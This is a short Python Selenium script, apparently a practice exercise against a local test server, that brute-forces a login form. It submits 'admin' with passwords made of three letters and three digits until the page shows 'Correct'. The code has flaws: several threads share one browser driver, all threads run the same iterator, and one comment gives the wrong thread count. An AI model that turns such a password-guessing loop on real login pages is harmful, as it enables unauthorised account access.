from selenium import webdriver
import itertools
import time
import threading

def guess_password(driver, iterator):
    for combination in iterator:
        for combination2 in itertools.product("0123456789", repeat=3):
            random_string = ''.join(combination) + ''.join(combination2)

            input_field1 = driver.find_element_by_name("username")
            input_field1.send_keys("admin")

            input_field = driver.find_element_by_name("password")
            input_field.send_keys(random_string)

            submit_button = driver.find_element_by_xpath("/html/body/form/input[3]")
            submit_button.click()

            try:
                if driver.find_element_by_xpath("/html/body/p").get_attribute("innerText") == "Correct":
                    print("Guessed favourite string:", random_string)
                    end_time = time.time()
                    print("Elapsed time:", end_time - start_time)
                    driver.quit()
                    exit()
            except:
                pass  # Ignore StaleElementReferenceException

driver = webdriver.Chrome()
driver.implicitly_wait(1)  # Set implicit wait time to 1 second
driver.get("http://127.0.0.1:5000")

start_time = time.time()

# Create 10 threads, each with its own iterator
threads = []
for i in range(6):
    iterator = itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=3)
    t = threading.Thread(target=guess_password, args=(driver, iterator))
    threads.append(t)
    t.start()

# Wait for all threads to finish
for t in threads:
    t.join()

driver.quit()
